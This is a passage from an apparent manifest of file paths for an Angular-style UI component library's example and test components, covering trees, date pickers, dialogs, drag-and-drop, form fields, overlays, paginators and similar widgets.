"common/tag/tag-with-icon/tag-with-icon.example.component.less",\n    "common/tag/tag-with-icon/tag-with-icon.example.component.ts",\n    "common/tag/tag.module.ts",\n    "common/tree/http-mock.service.ts",\n    "common/tree/index.ts",\n    "common/tree/tree-basic/tree-basic.example.component.html",\n    "common/tree/tree-basic/tree-basic.example.component.less",\n    "common/tree/tree-basic/tree-basic.example.component.ts",\n    "common/tree/tree-checkbox/tree-checkbox.example.component.html",\n    "common/tree/tree-checkbox/tree-checkbox.example.component.less",\n    "common/tree/tree-checkbox/tree-checkbox.example.component.ts",\n    "common/tree/tree-checkbox-lazy/tree-checkbox-lazy.component.html",\n    "common/tree/tree-checkbox-lazy/tree-checkbox-lazy.component.less",\n    "common/tree/tree-checkbox-lazy/tree-checkbox-lazy.component.ts",\n    "common/tree/tree-docs/tree-docs.example.component.html",\n    "common/tree/tree-docs/tree-docs.example.component.ts",\n    "common/tree/tree-lazy/tree-lazy.component.example.less",\n    "common/tree/tree-lazy/tree-lazy.example.component.html",\n    "common/tree/tree-lazy/tree-lazy.example.component.ts",\n    "common/tree/tree-leaf-pagination/tree-leaf-pagination.component.example.less",\n    "common/tree/tree-leaf-pagination/tree-leaf-pagination.example.component.html",\n    "common/tree/tree-leaf-pagination/tree-leaf-pagination.example.component.ts",\n    "common/tree/tree-load-more/tree-load-more.component.example.less",\n    "common/tree/tree-load-more/tree-load-more.example.component.html",\n    "common/tree/tree-load-more/tree-load-more.example.component.ts",\n    "common/tree/tree-show-all-dialog/tree-show-all-dialog.component.example.less",\n    "common/tree/tree-show-all-dialog/tree-show-all-dialog.example.component.html",\n    "common/tree/tree-show-all-dialog/tree-show-all-dialog.example.component.ts",\n    "common/tree/tree-styling/tree-styling.example.component.html",\n    "common/tree/tree-styling/tree-styling.example.component.less",\n    "common/tree/tree-styling/tree-styling.example.component.ts",\n    "common/tree/tree-visual-test/data.ts",\n    "common/tree/tree-visual-test/tree-basic-test/tree-basic-test.component.html",\n    "common/tree/tree-visual-test/tree-basic-test/tree-basic-test.component.less",\n    "common/tree/tree-visual-test/tree-basic-test/tree-basic-test.component.ts",\n    "common/tree/tree-visual-test/tree-checkbox-test/tree-checkbox-test.component.html",\n    "common/tree/tree-visual-test/tree-checkbox-test/tree-checkbox-test.component.less",\n    "common/tree/tree-visual-test/tree-checkbox-test/tree-checkbox-test.component.ts",\n    "common/tree/tree-visual-test/tree-paginator-test/tree-paginator-test.component.html",\n    "common/tree/tree-visual-test/tree-paginator-test/tree-paginator-test.component.less",\n    "common/tree/tree-visual-test/tree-paginator-test/tree-paginator-test.component.ts",\n    "common/tree/tree-visual-test/tree-visual-test.component.html",\n    "common/tree/tree-visual-test/tree-visual-test.component.ts",\n    "common/tree/tree-with-additional-content/tree-with-additional-content.example.component.html",\n    "common/tree/tree-with-additional-content/tree-with-additional-content.example.component.less",\n    "common/tree/tree-with-additional-content/tree-with-additional-content.example.component.ts",\n    "common/tree/tree.module.ts",\n    "common/unit-conversion-service/docs/unit-conversion-service-docs.component.html",\n    "common/unit-conversion-service/docs/unit-conversion-service-docs.component.less",\n    "common/unit-conversion-service/docs/unit-conversion-service-docs.component.ts",\n    "common/unit-conversion-service/unit-conversion-service-basic/unit-conversion-service-basic.example.component.html",\n    "common/unit-conversion-service/unit-conversion-service-basic/unit-conversion-service-basic.example.component.less",\n    "common/unit-conversion-service/unit-conversion-service-basic/unit-conversion-service-basic.example.component.ts",\n    "common/unit-conversion-service/unit-conversion-service-example.module.ts",\n    "common/unit-conversion-service/unit-conversion-service-separate-unit-display/unit-conversion-service-separate-unit-display.example.component.html",\n    "common/unit-conversion-service/unit-conversion-service-separate-unit-display/unit-conversion-service-separate-unit-display.example.component.less",\n    "common/unit-conversion-service/unit-conversion-service-separate-unit-display/unit-conversion-service-separate-unit-display.example.component.ts",\n    "common/viewport-manager/repeat-with-viewport-manager/repeat-with-viewport-manager.example.component.html",\n    "common/viewport-manager/repeat-with-viewport-manager/repeat-with-viewport-manager.example.component.ts",\n    "common/viewport-manager/virtual-viewport-manager-docs/virtual-viewport-manager-docs.component.html",\n    "common/viewport-manager/virtual-viewport-manager-docs/virtual-viewport-manager-docs.component.ts",\n    "common/welcome/welcome-page.component.html",\n    "common/welcome/welcome-page.component.ts",\n    "content/content.example.component.html",\n    "content/content.example.component.ts",\n    "content/content.module.ts",\n    "convenience/convenience.module.ts",\n    "convenience/index.ts",\n    "convenience/summary/summary.component.html",\n    "convenience/summary/summary.component.ts",\n    "convenience/time-frame-bar/time-frame-bar-basic/time-frame-bar-basic.example.component.html",\n    "convenience/time-frame-bar/time-frame-bar-basic/time-frame-bar-basic.example.component.ts",\n    "convenience/time-frame-bar/time-frame-bar-docs/time-frame-bar-docs.example.component.html",\n    "convenience/time-frame-bar/time-frame-bar-docs/time-frame-bar-docs.example.component.ts",\n    "convenience/time-frame-bar/time-frame-bar-test/time-frame-bar-test.component.html",\n    "convenience/time-frame-bar/time-frame-bar-test/time-frame-bar-test.component.ts",\n    "convenience/time-frame-bar/time-frame-bar-visual/time-frame-bar-visual.component.html",\n    "convenience/time-frame-bar/time-frame-bar-visual/time-frame-bar-visual.component.ts",\n    "convenience/time-frame-bar/time-frame-bar-zoom/time-frame-bar-zoom.example.component.html",\n    "convenience/time-frame-bar/time-frame-bar-zoom/time-frame-bar-zoom.example.component.ts",\n    "convenience/time-frame-bar/time-frame-bar.module.ts",\n    "date-picker/date-picker-basic/date-picker-basic.example.component.html",\n    "date-picker/date-picker-basic/date-picker-basic.example.component.ts",\n    "date-picker/date-picker-calendar-navigated/date-picker-calendar-navigated.example.component.html",\n    "date-picker/date-picker-calendar-navigated/date-picker-calendar-navigated.example.component.ts",\n    "date-picker/date-picker-current-month/date-picker-current-month.example.component.html",\n    "date-picker/date-picker-current-month/date-picker-current-month.example.component.ts",\n    "date-picker/date-picker-date-range/date-picker-date-range.example.component.html",\n    "date-picker/date-picker-date-range/date-picker-date-range.example.component.ts",\n    "date-picker/date-picker-disable-date/date-picker-disable-date.example.component.html",\n    "date-picker/date-picker-disable-date/date-picker-disable-date.example.component.ts",\n    "date-picker/date-picker-disabled/date-picker-disabled.example.component.html",\n    "date-picker/date-picker-disabled/date-picker-disabled.example.component.ts",\n    "date-picker/date-picker-docs/date-picker-docs.example.component.html",\n    "date-picker/date-picker-docs/date-picker-docs.example.component.ts",\n    "date-picker/date-picker-first-date-of-week/date-picker-first-date-of-week.example.component.html",\n    "date-picker/date-picker-first-date-of-week/date-picker-first-date-of-week.example.component.ts",\n    "date-picker/date-picker-formatting/date-picker-formatting.example.component.html",\n    "date-picker/date-picker-formatting/date-picker-formatting.example.component.ts",\n    "date-picker/date-picker-init-date/date-picker-init-date.example.component.html",\n    "date-picker/date-picker-init-date/date-picker-init-date.example.component.ts",\n    "date-picker/date-picker-init-mode/date-picker-init-mode.example.component.html",\n    "date-picker/date-picker-init-mode/date-picker-init-mode.example.component.ts",\n    "date-picker/date-picker-inline/date-picker-inline.example.component.html",\n    "date-picker/date-picker-inline/date-picker-inline.example.component.ts",\n    "date-picker/date-picker-insignificant/date-picker-insignificant.example.component.html",\n    "date-picker/date-picker-insignificant/date-picker-insignificant.example.component.ts",\n    "date-picker/date-picker-modes-range/date-picker-modes-range.example.component.html",\n    "date-picker/date-picker-modes-range/date-picker-modes-range.example.component.ts",\n    "date-picker/date-picker-reactive-form/date-picker-reactive-form.example.component.html",\n    "date-picker/date-picker-reactive-form/date-picker-reactive-form.example.component.ts",\n    "date-picker/date-picker-show-weeks/date-picker-show-weeks.example.component.html",\n    "date-picker/date-picker-show-weeks/date-picker-show-weeks.example.component.ts",\n    "date-picker/date-picker-test/date-picker-test.component.html",\n    "date-picker/date-picker-test/date-picker-test.component.ts",\n    "date-picker/date-picker-timezone/date-picker-timezone.example.component.html",\n    "date-picker/date-picker-timezone/date-picker-timezone.example.component.ts",\n    "date-picker/date-picker-value-change/date-picker-value-change.example.component.html",\n    "date-picker/date-picker-value-change/date-picker-value-change.example.component.ts",\n    "date-picker/date-picker-visual-test/date-picker-visual-test.component.html",\n    "date-picker/date-picker-visual-test/date-picker-visual-test.component.ts",\n    "date-picker/date-picker-with-error/date-picker-with-error.example.component.html",\n    "date-picker/date-picker-with-error/date-picker-with-error.example.component.ts",\n    "date-picker/date-picker-year-range/date-picker-year-range.example.component.html",\n    "date-picker/date-picker-year-range/date-picker-year-range.example.component.ts",\n    "date-picker/date-picker.module.ts",\n    "date-picker/index.ts",\n    "date-time-picker/date-time-picker-basic/date-time-picker-basic.example.component.html",\n    "date-time-picker/date-time-picker-basic/date-time-picker-basic.example.component.ts",\n    "date-time-picker/date-time-picker-dialog/date-time-picker-dialog.example.component.html",\n    "date-time-picker/date-time-picker-dialog/date-time-picker-dialog.example.component.ts",\n    "date-time-picker/date-time-picker-disabled/date-time-picker-disabled.example.component.html",\n    "date-time-picker/date-time-picker-disabled/date-time-picker-disabled.example.component.ts",\n    "date-time-picker/date-time-picker-docs/date-time-picker-docs.example.component.html",\n    "date-time-picker/date-time-picker-docs/date-time-picker-docs.example.component.ts",\n    "date-time-picker/date-time-picker-empty-state/date-time-picker-empty-state.component.html",\n    "date-time-picker/date-time-picker-empty-state/date-time-picker-empty-state.component.ts",\n    "date-time-picker/date-time-picker-inline/date-time-picker-inline.example.component.html",\n    "date-time-picker/date-time-picker-inline/date-time-picker-inline.example.component.ts",\n    "date-time-picker/date-time-picker-range-values/date-time-picker-range-values.example.component.html",\n    "date-time-picker/date-time-picker-range-values/date-time-picker-range-values.example.component.ts",\n    "date-time-picker/date-time-picker-reactive-form/date-time-picker-reactive-form.example.component.html",\n    "date-time-picker/date-time-picker-reactive-form/date-time-picker-reactive-form.example.component.ts",\n    "date-time-picker/date-time-picker-test/date-time-picker-test.component.html",\n    "date-time-picker/date-time-picker-test/date-time-picker-test.component.ts",\n    "date-time-picker/date-time-picker-timezones/date-time-picker-timezones.example.component.html",\n    "date-time-picker/date-time-picker-timezones/date-time-picker-timezones.example.component.ts",\n    "date-time-picker/date-time-picker-visual-test/date-time-picker-visual-test.component.html",\n    "date-time-picker/date-time-picker-visual-test/date-time-picker-visual-test.component.ts",\n    "date-time-picker/date-time-picker.module.ts",\n    "date-time-picker/index.ts",\n    "demo.files.ts",\n    "dialog/component-as-content/component-as-content.example.component.html",\n    "dialog/component-as-content/component-as-content.example.component.ts",\n    "dialog/component-as-content/dialog-content.example.component.html",\n    "dialog/component-as-content/dialog-content.example.component.ts",\n    "dialog/confirmation-dialog/confirmation-dialog.example.component.html",\n    "dialog/confirmation-dialog/confirmation-dialog.example.component.ts",\n    "dialog/dialog-actions-before-closure/dialog-actions-before-closure.example.component.html",\n    "dialog/dialog-actions-before-closure/dialog-actions-before-closure.example.component.ts",\n    "dialog/dialog-after-opened/dialog-after-opened.example.component.html",\n    "dialog/dialog-after-opened/dialog-after-opened.example.component.ts",\n    "dialog/dialog-custom-class/dialog-custom-class.example.component.html",\n    "dialog/dialog-custom-class/dialog-custom-class.example.component.ts",\n    "dialog/dialog-docs/dialog-docs.example.component.html",\n    "dialog/dialog-docs/dialog-docs.example.component.ts",\n    "dialog/dialog-inside-overlay/dialog-inside-overlay.example.component.html",\n    "dialog/dialog-inside-overlay/dialog-inside-overlay.example.component.ts",\n    "dialog/dialog-inside-overlay-with-date-time-picker/dialog-inside-overlay-with-date-time-picker.example.component.html",\n    "dialog/dialog-inside-overlay-with-date-time-picker/dialog-inside-overlay-with-date-time-picker.example.component.ts",\n    "dialog/dialog-keyboard/dialog-with-keyboard.example.component.html",\n    "dialog/dialog-keyboard/dialog-with-keyboard.example.component.ts",\n    "dialog/dialog-position/dialog-position.example.component.html",\n    "dialog/dialog-position/dialog-position.example.component.ts",\n    "dialog/dialog-severity/dialog-severity.example.component.html",\n    "dialog/dialog-severity/dialog-severity.example.component.ts",\n    "dialog/dialog-sizes/dialog-sizes.example.component.html",\n    "dialog/dialog-sizes/dialog-sizes.example.component.ts",\n    "dialog/dialog-static-backdrop/dialog-with-static-backdrop.example.component.html",\n    "dialog/dialog-static-backdrop/dialog-with-static-backdrop.example.component.ts",\n    "dialog/dialog-test/dialog-test.example.component.html",\n    "dialog/dialog-test/dialog-test.example.component.ts",\n    "dialog/dialog-visual-test/dialog-visual-test.component.html",\n    "dialog/dialog-visual-test/dialog-visual-test.component.ts",\n    "dialog/dialog-zindex-test/dialog-zindex-test.component.html",\n    "dialog/dialog-zindex-test/dialog-zindex-test.component.less",\n    "dialog/dialog-zindex-test/dialog-zindex-test.component.ts",\n    "dialog/dialog.module.ts",\n    "dialog/header-buttons/header-buttons.example.component.html",\n    "dialog/header-buttons/header-buttons.example.component.ts",\n    "dialog/index.ts",\n    "dialog/simple-dialog/simple-dialog.example.component.html",\n    "dialog/simple-dialog/simple-dialog.example.component.ts",\n    "divider/divider-docs/divider-docs.example.component.html",\n    "divider/divider-docs/divider-docs.example.component.ts",\n    "divider/divider.module.ts",\n    "divider/horizontal-dividers/horizontal-dividers.example.component.html",\n    "divider/horizontal-dividers/horizontal-dividers.example.component.ts",\n    "divider/index.ts",\n    "divider/vertical-dividers/vertical-dividers.example.component.html",\n    "divider/vertical-dividers/vertical-dividers.example.component.ts",\n    "dragdrop/dragdrop-basic/dragdrop-basic.example.component.html",\n    "dragdrop/dragdrop-basic/dragdrop-basic.example.component.less",\n    "dragdrop/dragdrop-basic/dragdrop-basic.example.component.ts",\n    "dragdrop/dragdrop-cdk/dragdrop-cdk.example.component.html",\n    "dragdrop/dragdrop-cdk/dragdrop-cdk.example.component.less",\n    "dragdrop/dragdrop-cdk/dragdrop-cdk.example.component.ts",\n    "dragdrop/dragdrop-docs/dragdrop-docs.example.component.html",\n    "dragdrop/dragdrop-docs/dragdrop-docs.example.component.ts",\n    "dragdrop/dragdrop-files/dragdrop-files.example.component.html",\n    "dragdrop/dragdrop-files/dragdrop-files.example.component.less",\n    "dragdrop/dragdrop-files/dragdrop-files.example.component.ts",\n    "dragdrop/dragdrop.module.ts",\n    "dragdrop/file-drop/file-drop.component.html",\n    "dragdrop/file-drop/file-drop.component.less",\n    "dragdrop/file-drop/file-drop.component.ts",\n    "dragdrop/file-drop/file-drop.module.ts",\n    "dragdrop/file-drop/public-api.ts",\n    "dragdrop/index.ts",\n    "dragdrop-cdk/dragdrop.example.component.html",\n    "dragdrop-cdk/dragdrop.example.component.less",\n    "dragdrop-cdk/dragdrop.example.component.ts",\n    "dragdrop-cdk/dragdrop.module.ts",\n    "expander/expander-basic/expander-basic.example.component.html",\n    "expander/expander-basic/expander-basic.example.component.ts",\n    "expander/expander-custom-header/expander-custom-header.example.component.html",\n    "expander/expander-custom-header/expander-custom-header.example.component.ts",\n    "expander/expander-docs/expander-docs.example.component.html",\n    "expander/expander-docs/expander-docs.example.component.ts",\n    "expander/expander-header-text/expander-header-text.example.component.html",\n    "expander/expander-header-text/expander-header-text.example.component.ts",\n    "expander/expander-initially-expanded/expander-initially-expanded.example.component.html",\n    "expander/expander-initially-expanded/expander-initially-expanded.example.component.ts",\n    "expander/expander-open-change/expander-open-change.example.component.html",\n    "expander/expander-open-change/expander-open-change.example.component.ts",\n    "expander/expander-test/expander-test.component.html",\n    "expander/expander-test/expander-test.component.ts",\n    "expander/expander-text-and-icon/expander-text-and-icon.example.component.html",\n    "expander/expander-text-and-icon/expander-text-and-icon.example.component.ts",\n    "expander/expander-visual-test/expander-visual-test.component.html",\n    "expander/expander-visual-test/expander-visual-test.component.ts",\n    "expander/expander-without-border/expander-without-border.example.component.html",\n    "expander/expander-without-border/expander-without-border.example.component.ts",\n    "expander/expander.module.ts",\n    "expander/index.ts",\n    "external-libraries/drag-and-drop/dnd-axis-constraints/dnd-axis-constraints.example.component.html",\n    "external-libraries/drag-and-drop/dnd-axis-constraints/dnd-axis-constraints.example.component.less",\n    "external-libraries/drag-and-drop/dnd-axis-constraints/dnd-axis-constraints.example.component.ts",\n    "external-libraries/drag-and-drop/dnd-basic/dnd-basic.example.component.html",\n    "external-libraries/drag-and-drop/dnd-basic/dnd-basic.example.component.less",\n    "external-libraries/drag-and-drop/dnd-basic/dnd-basic.example.component.ts",\n    "external-libraries/drag-and-drop/dnd-custom-handle/dnd-custom-handle.example.component.html",\n    "external-libraries/drag-and-drop/dnd-custom-handle/dnd-custom-handle.example.component.less",\n    "external-libraries/drag-and-drop/dnd-custom-handle/dnd-custom-handle.example.component.ts",\n    "external-libraries/drag-and-drop/dnd-docs/dnd-docs.example.component.html",\n    "external-libraries/drag-and-drop/dnd-docs/dnd-docs.example.component.ts",\n    "external-libraries/drag-and-drop/dnd-drag-disabled/dnd-drag-disabled-example.component.html",\n    "external-libraries/drag-and-drop/dnd-drag-disabled/dnd-drag-disabled-example.component.less",\n    "external-libraries/drag-and-drop/dnd-drag-disabled/dnd-drag-disabled-example.component.ts",\n    "external-libraries/drag-and-drop/dnd-drag-placeholder/dnd-drag-placeholder-example.component.html",\n    "external-libraries/drag-and-drop/dnd-drag-placeholder/dnd-drag-placeholder-example.component.less",\n    "external-libraries/drag-and-drop/dnd-drag-placeholder/dnd-drag-placeholder-example.component.ts",\n    "external-libraries/drag-and-drop/dnd-drag-preview/dnd-drag-preview.example.component.html",\n    "external-libraries/drag-and-drop/dnd-drag-preview/dnd-drag-preview.example.component.less",\n    "external-libraries/drag-and-drop/dnd-drag-preview/dnd-drag-preview.example.component.ts",\n    "external-libraries/drag-and-drop/dnd-dropzone/dnd-dropzone.example.component.html",\n    "external-libraries/drag-and-drop/dnd-dropzone/dnd-dropzone.example.component.less",\n    "external-libraries/drag-and-drop/dnd-dropzone/dnd-dropzone.example.component.ts",\n    "external-libraries/drag-and-drop/dnd-dropzone-visual/dnd-dropzone-visual-example.component.html",\n    "external-libraries/drag-and-drop/dnd-dropzone-visual/dnd-dropzone-visual-example.component.less",\n    "external-libraries/drag-and-drop/dnd-dropzone-visual/dnd-dropzone-visual-example.component.ts",\n    "external-libraries/drag-and-drop/dnd.module.ts",\n    "external-libraries/external-libraries.module.ts",\n    "external-libraries/index.ts",\n    "external-libraries/summary/summary.component.html",\n    "external-libraries/summary/summary.component.ts",\n    "form-field/basic/basic-form-field.example.component.html",\n    "form-field/basic/basic-form-field.example.component.ts",\n    "form-field/basic-hint/form-field-hint.example.component.html",\n    "form-field/basic-hint/form-field-hint.example.component.ts",\n    "form-field/basic-reactive/basic-reactive-form-field-custom-validation.example.component.html",\n    "form-field/basic-reactive/basic-reactive-form-field-custom-validation.example.component.ts",\n    "form-field/basic-reactive/basic-reactive-form-field.example.component.html",\n    "form-field/basic-reactive/basic-reactive-form-field.example.component.ts",\n    "form-field/complex/form-field-complex.example.component.html",\n    "form-field/complex/form-field-complex.example.component.ts",\n    "form-field/dynamic-disabling/form-field-dynamic-disabling.example.component.html",\n    "form-field/dynamic-disabling/form-field-dynamic-disabling.example.component.ts",\n    "form-field/form-field-docs/form-field-docs.example.component.html",\n    "form-field/form-field-docs/form-field-docs.example.component.ts",\n    "form-field/form-field-test/form-field-test.component.html",\n    "form-field/form-field-test/form-field-test.component.ts",\n    "form-field/form-field-validation-triggering/form-field-validation-triggering.example.component.html",\n    "form-field/form-field-validation-triggering/form-field-validation-triggering.example.component.ts",\n    "form-field/form-field-visual-test/form-field-visual-test.component.html",\n    "form-field/form-field-visual-test/form-field-visual-test.component.ts",\n    "form-field/form-field.module.ts",\n    "form-field/html-as-info/html-as-info-in-form-field.example.component.html",\n    "form-field/html-as-info/html-as-info-in-form-field.example.component.ts",\n    "form-field/in-form/in-form-form-field.example.component.html",\n    "form-field/in-form/in-form-form-field.example.component.ts",\n    "form-field/index.ts",\n    "form-field/nested-forms-as-component/nested-forms-as-component.example.component.html",\n    "form-field/nested-forms-as-component/nested-forms-as-component.example.component.ts",\n    "freetype-query-builder/freetype-query-builder-basic/example-help.ts",\n    "freetype-query-builder/freetype-query-builder-basic/example-tokenizer.ts",\n    "freetype-query-builder/freetype-query-builder-basic/freetype-query-builder-basic.example.component.html",\n    "freetype-query-builder/freetype-query-builder-basic/freetype-query-builder-basic.example.component.ts",\n    "freetype-query-builder/freetype-query-builder-basic/models.ts",\n    "freetype-query-builder/freetype-query-builder-basic/renderer.ts",\n    "freetype-query-builder/freetype-query-builder-docs/freetype-query-builder-docs.example.component.html",\n    "freetype-query-builder/freetype-query-builder-docs/freetype-query-builder-docs.example.component.less",\n    "freetype-query-builder/freetype-query-builder-docs/freetype-query-builder-docs.example.component.ts",\n    "freetype-query-builder/freetype-query-builder-test/example-help.ts",\n    "freetype-query-builder/freetype-query-builder-test/example-tokenizer.ts",\n    "freetype-query-builder/freetype-query-builder-test/freetype-query-builder-test.component.html",\n    "freetype-query-builder/freetype-query-builder-test/freetype-query-builder-test.component.ts",\n    "freetype-query-builder/freetype-query-builder-test/models.ts",\n    "freetype-query-builder/freetype-query-builder-test/renderer.ts",\n    "freetype-query-builder/freetype-query-builder-visual-test/example-freetype-query-builder.component.html",\n    "freetype-query-builder/freetype-query-builder-visual-test/example-freetype-query-builder.component.ts",\n    "freetype-query-builder/freetype-query-builder-visual-test/freetype-query-builder-visual-test.component.html",\n    "freetype-query-builder/freetype-query-builder-visual-test/freetype-query-builder-visual-test.component.ts",\n    "freetype-query-builder/freetype-query-builder.module.ts",\n    "freetype-query-builder/index.ts",\n    "highlight/highlight.example.component.html",\n    "highlight/highlight.example.component.ts",\n    "highlight/highlight.module.ts",\n    "icon/icon-basic/icon-basic.example.component.html",\n    "icon/icon-basic/icon-basic.example.component.ts",\n    "icon/icon-child-status/icon-child-status.example.component.html",\n    "icon/icon-child-status/icon-child-status.example.component.ts",\n    "icon/icon-color/icon-color.example.component.html",\n    "icon/icon-color/icon-color.example.component.ts",\n    "icon/icon-counter/icon-counter.example.component.html",\n    "icon/icon-counter/icon-counter.example.component.ts",\n    "icon/icon-docs/icon-docs.example.component.html",\n    "icon/icon-docs/icon-docs.example.component.ts",\n    "icon/icon-hover/icon-hover.example.component.html",\n    "icon/icon-hover/icon-hover.example.component.ts",\n    "icon/icon-list/icon-list.example.component.html",\n    "icon/icon-list/icon-list.example.component.ts",\n    "icon/icon-size/icon-size.example.component.html",\n    "icon/icon-size/icon-size.example.component.ts",\n    "icon/icon-status/icon-status.example.component.html",\n    "icon/icon-status/icon-status.example.component.ts",\n    "icon/icon-visual-test/icon-visual-test.component.html",\n    "icon/icon-visual-test/icon-visual-test.component.ts",\n    "icon/icon-with-text/icon-with-text.example.component.html",\n    "icon/icon-with-text/icon-with-text.example.component.ts",\n    "icon/icon.module.ts",\n    "icon/index.ts",\n    "image/image-basic/image-basic.example.component.html",\n    "image/image-basic/image-basic.example.component.ts",\n    "image/image-docs/image-docs.example.component.html",\n    "image/image-docs/image-docs.example.component.ts",\n    "image/image-external/image-external.example.component.html",\n    "image/image-external/image-external.example.component.ts",\n    "image/image-float/image-float.example.component.html",\n    "image/image-float/image-float.example.component.ts",\n    "image/image-list/image-list.example.component.html",\n    "image/image-list/image-list.example.component.ts",\n    "image/image-margin/image-margin.example.component.html",\n    "image/image-margin/image-margin.example.component.ts",\n    "image/image-test/image-test.component.html",\n    "image/image-test/image-test.component.ts",\n    "image/image-visual-test/image-visual-test.component.html",\n    "image/image-visual-test/image-visual-test.component.ts",\n    "image/image-watermarked/image-watermarked.example.component.html",\n    "image/image-watermarked/image-watermarked.example.component.ts",\n    "image/image-width-height-and-autoFill/image-width-height-and-autoFill.example.component.html",\n    "image/image-width-height-and-autoFill/image-width-height-and-autoFill.example.component.less",\n    "image/image-width-height-and-autoFill/image-width-height-and-autoFill.example.component.ts",\n    "image/image.module.ts",\n    "image/index.ts",\n    "layout/index.ts",\n    "layout/layout-basic/layout-basic.example.component.html",\n    "layout/layout-basic/layout-basic.example.component.less",\n    "layout/layout-basic/layout-basic.example.component.ts",\n    "layout/layout-complex/layout-complex.example.component.html",\n    "layout/layout-complex/layout-complex.example.component.less",\n    "layout/layout-complex/layout-complex.example.component.ts",\n    "layout/layout-docs/layout-docs.example.component.html",\n    "layout/layout-docs/layout-docs.example.component.ts",\n    "layout/layout-fit-content/layout-fit-content.example.component.html",\n    "layout/layout-fit-content/layout-fit-content.example.component.less",\n    "layout/layout-fit-content/layout-fit-content.example.component.ts",\n    "layout/layout-init-size/layout-init-size.component.html",\n    "layout/layout-init-size/layout-init-size.component.ts",\n    "layout/layout-page-content/layout-page-content.example.component.html",\n    "layout/layout-page-content/layout-page-content.example.component.ts",\n    "layout/layout-page-content/layout-page-content.example.less",\n    "layout/layout-resize/layout-resize.example.component.html",\n    "layout/layout-resize/layout-resize.example.component.less",\n    "layout/layout-resize/layout-resize.example.component.ts",\n    "layout/layout-separate-sheets/layout-separate-sheets.example.component.html",\n    "layout/layout-separate-sheets/layout-separate-sheets.example.component.less",\n    "layout/layout-separate-sheets/layout-separate-sheets.example.component.ts",\n    "layout/layout-test/layout-test.component.html",\n    "layout/layout-test/layout-test.component.ts",\n    "layout/layout-visual-test/layout-visual-test.component.html",\n    "layout/layout-visual-test/layout-visual-test.component.ts",\n    "layout/layout.module.ts",\n    "menu/basic-menu/basic-menu.example.component.html",\n    "menu/basic-menu/basic-menu.example.component.ts",\n    "menu/index.ts",\n    "menu/menu-append-to-body/menu-append-to-body.example.component.html",\n    "menu/menu-append-to-body/menu-append-to-body.example.component.ts",\n    "menu/menu-custom-item/menu-custom-item.example.component.html",\n    "menu/menu-custom-item/menu-custom-item.example.component.less",\n    "menu/menu-custom-item/menu-custom-item.example.component.ts",\n    "menu/menu-docs/menu-docs.example.component.html",\n    "menu/menu-docs/menu-docs.example.component.ts",\n    "menu/menu-item-variations/menu-item-variations.example.component.html",\n    "menu/menu-item-variations/menu-item-variations.example.component.ts",\n    "menu/menu-test/menu-test.component.html",\n    "menu/menu-test/menu-test.component.ts",\n    "menu/menu-visual-test/menu-visual-test.component.html",\n    "menu/menu-visual-test/menu-visual-test.component.ts",\n    "menu/menu.module.ts",\n    "message/index.ts",\n    "message/message-basic/message-basic.example.component.html",\n    "message/message-basic/message-basic.example.component.ts",\n    "message/message-critical/message-critical.example.component.html",\n    "message/message-critical/message-critical.example.component.ts",\n    "message/message-docs/message-docs.example.component.html",\n    "message/message-docs/message-docs.example.component.ts",\n    "message/message-info/message-info.example.component.html",\n    "message/message-info/message-info.example.component.ts",\n    "message/message-manual-control/message-manual-control.example.component.html",\n    "message/message-manual-control/message-manual-control.example.component.ts",\n    "message/message-not-dismissable/message-not-dismissable.example.component.html",\n    "message/message-not-dismissable/message-not-dismissable.example.component.ts",\n    "message/message-ok/message-ok.example.component.html",\n    "message/message-ok/message-ok.example.component.ts",\n    "message/message-test/message-test.component.html",\n    "message/message-test/message-test.component.ts",\n    "message/message-visual-test/message-visual-test.component.html",\n    "message/message-visual-test/message-visual-test.component.ts",\n    "message/message-warning/message-warning.example.component.html",\n    "message/message-warning/message-warning.example.component.ts",\n    "message/message.module.ts",\n    "overlay/index.ts",\n    "overlay/overlay-arrow/overlay-arrow.example.component.html",\n    "overlay/overlay-arrow/overlay-arrow.example.component.less",\n    "overlay/overlay-arrow/overlay-arrow.example.component.ts",\n    "overlay/overlay-custom-confirmation-inside-dialog/overlay-custom-confirmation-inside-dialog.component.html",\n    "overlay/overlay-custom-confirmation-inside-dialog/overlay-custom-confirmation-inside-dialog.component.less",\n    "overlay/overlay-custom-confirmation-inside-dialog/overlay-custom-confirmation-inside-dialog.component.ts",\n    "overlay/overlay-custom-container/overlay-custom-container.example.component.html",\n    "overlay/overlay-custom-container/overlay-custom-container.example.component.ts",\n    "overlay/overlay-custom-dialog/overlay-custom-dialog.component.html",\n    "overlay/overlay-custom-dialog/overlay-custom-dialog.component.less",\n    "overlay/overlay-custom-dialog/overlay-custom-dialog.component.ts",\n    "overlay/overlay-custom-styles/overlay-custom-styles.example.component.html",\n    "overlay/overlay-custom-styles/overlay-custom-styles.example.component.less",\n    "overlay/overlay-custom-styles/overlay-custom-styles.example.component.ts",\n    "overlay/overlay-docs/overlay-docs.example.component.html",\n    "overlay/overlay-docs/overlay-docs.example.component.ts",\n    "overlay/overlay-popup-styles/overlay-popup-styles.example.component.html",\n    "overlay/overlay-popup-styles/overlay-popup-styles.example.component.ts",\n    "overlay/overlay-show-hide-toggle/overlay-show-hide-toggle.example.component.html",\n    "overlay/overlay-show-hide-toggle/overlay-show-hide-toggle.example.component.ts",\n    "overlay/overlay-simple-usage/overlay-simple-usage.example.component.html",\n    "overlay/overlay-simple-usage/overlay-simple-usage.example.component.ts",\n    "overlay/overlay-test/overlay-test.example.component.html",\n    "overlay/overlay-test/overlay-test.example.component.less",\n    "overlay/overlay-test/overlay-test.example.component.ts",\n    "overlay/overlay-viewport-margin/overlay-viewport-margin-example.component.ts",\n    "overlay/overlay-viewport-margin/overlay-viewport-margin.example.component.html",\n    "overlay/overlay.module.ts",\n    "paginator/index.ts",\n    "paginator/paginator-adjacent/paginator-adjacent.example.component.html",\n    "paginator/paginator-adjacent/paginator-adjacent.example.component.ts",\n    "paginator/paginator-basic/paginator-basic.example.component.html",\n    "paginator/paginator-basic/paginator-basic.example.component.ts",\n    "paginator/paginator-custom-page-set/paginator-custom-page-set.example.component.html",\n    "paginator/paginator-custom-page-set/paginator-custom-page-set.example.component.ts",\n    "paginator/paginator-docs/paginator-docs.example.component.html",\n    "paginator/paginator-docs/paginator-docs.example.component.ts",\n    "paginator/paginator-hidden-prev-next/paginator-hidden-prev-next.example.component.html",\n    "paginator/paginator-hidden-prev-next/paginator-hidden-prev-next.example.component.ts",\n    "paginator/paginator-styling/paginator-styling.example.component.html",\n    "paginator/paginator-styling/paginator-styling.example.component.ts",\n    "paginator/paginator-test/paginator-test.component.html",\n    "paginator/paginator-test/paginator-test.component.ts",\n    